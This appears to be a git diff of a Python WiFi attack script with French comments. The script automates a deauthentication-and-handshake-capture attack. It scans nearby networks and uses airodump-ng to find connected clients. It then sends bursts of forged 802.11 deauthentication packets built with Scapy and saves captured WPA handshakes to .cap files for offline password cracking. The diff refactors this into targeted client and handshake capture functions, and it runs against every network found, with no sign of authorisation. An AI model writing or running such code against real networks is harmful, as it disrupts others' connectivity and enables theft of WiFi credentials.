@@ -8,6 +8,7 @@ import subprocess
 import shlex
 import time
 from threading import Timer
+import string, random
 """
 TODO
 
@@ -26,9 +27,10 @@ REVERSE = "\033[;7m"
 
 
 #Set the parameters like you want
-packet_sniff_timeout = 20
-timeout_airodump = 20
-deauth_packets = 200
+packet_sniff_timeout = 10
+timeout_airodump_handshake = 20
+timeout_airodump_client = 10
+deauth_packets = 100
 
 
 
@@ -113,7 +115,7 @@ networks = scan_wifi_networks()
 # Affichage des réseaux WiFi
 display_wifi_networks(networks)
 
-def handshake_grab(command, timeout):
+def start_command(command, timeout):
     process = subprocess.Popen(shlex.split(command), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
     # Fonction pour tuer le processus si le timeout est atteint
@@ -135,37 +137,72 @@ def handshake_grab(command, timeout):
 
 
 
+def client_grab(mac_now, channel, ssid):
+    global client
+    command = f"airodump-ng --bssid {mac_now} --channel {channel} {wlanmon}" # essaye de chopper le client
+    client_output = start_command(command, timeout_airodump_client)
+    # Utilisation de la regex pour grep le client
+    regex = rf'{mac_now}  ([A-F0-9:]+)'
+    match = re.search(regex, client_output)
+    if match:
+        client = match.group(0)
+        client = client.replace(f'{mac_now}','')
+        print(BOLD, GREEN,f'BOOM ! For {ssid} the Client is : {client}', RESET)
+    else:
+        print(f"{client_output}  \n\n {regex}")
+        print(RED,"[-] No clients Found ",RESET)
+        print(BLUE,f'[*] Make Broadcast client MAC : "FF:FF:FF:FF:FF:FF" ')
+        client = "FF:FF:FF:FF:FF:FF"
+    
+
+def handshake_grab(mac, channel, ssid):
+    global handshake
+
+    #name the output file
+    letters = string.ascii_lowercase
+    out_filename = ssid + ''.join(random.choice(letters) for _ in range(4))
+
+    #hadshake capture command
+    command = f"airodump-ng --bssid {mac} --channel {channel} -w {out_filename} {wlanmon}" # essaye de chopper le handshake
+    output_handshake = start_command(command, timeout_airodump_handshake)
+
+    # Utilisation de la regex pour grep le handshake
+    regex = r'WPA handshake: ([A-F0-9:]+)'
+    match = re.search(regex, output_handshake)
+    if match:
+        handshake = match.group(0)
+        print(BOLD, GREEN,f'BOOM ! For {ssid} the Handshake files is : {out_filename}.cap', RESET)
+    else:
+        print(RED,"[-] No handshake Found",RESET)
+        print(BLUE,f'[*] Result of Airodump : {output_handshake} ')
+
+
 
 #prise d'infos (client pour deauth)
 if bssid_list:
-    for mac in bssid_list: 
+    for mac, ssid in zip(bssid_list, ssid_list):
         
         #pas besoin d'avoir le MAC du client pour deauth...
+        mac_now = mac.upper()
 
         def deauth_wifi(mac, interface):
-            #construction de la requete deauth, avec la MAC de broadcast
+        
+            #Grab le client
+            client_grab(mac_now, channel, ssid)
 
-            packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=mac, addr3=mac)/Dot11Deauth()
+            #requete de deauth pour le client
+            packet = RadioTap()/Dot11(addr1=client, addr2=mac, addr3=mac)/Dot11Deauth()
 
-            print(BLUE,f"\n[+] DeAuth for MAC : {mac}\n\n",RED)
+            print(BLUE,f"\n[+] DeAuth for : {ssid} with mac : {mac}\n\n",RED)
 
             
             sendp(packet, iface=interface, count=deauth_packets, inter=0.1, verbose=1),RESET# BOOM wifi deauth
 
-            command = f"airodump-ng --bssid {mac} --channel {channel} {wlanmon}" # essaye de chopper le handshake
-            output = handshake_grab(command, timeout_airodump)
-            #print(output)
 
-            # Utilisation de la regex pour grep le handshake
-            regex = r'WPA handshake: ([A-F0-9:]+)'
-            match = re.search(regex, output)
+            #recup du handshake
+            handshake_grab(mac_now, channel, ssid)
 
-            if match:
-                handshake = match.group(0)
-                print(BOLD, GREEN,f'BOOM ! For {mac} the Handshake is : {handshake}', RESET)
-            else:
-                print(RED,"[-] No handshake Found",RESET)
-                print(BLUE,f'[*] Result of Airodump : {output} ')
+           
 
         deauth_wifi(mac, interface)
 
@@ -175,7 +212,9 @@ else:
     sys.exit()
     
 
-
+"""
+           
+"""
 
 
 
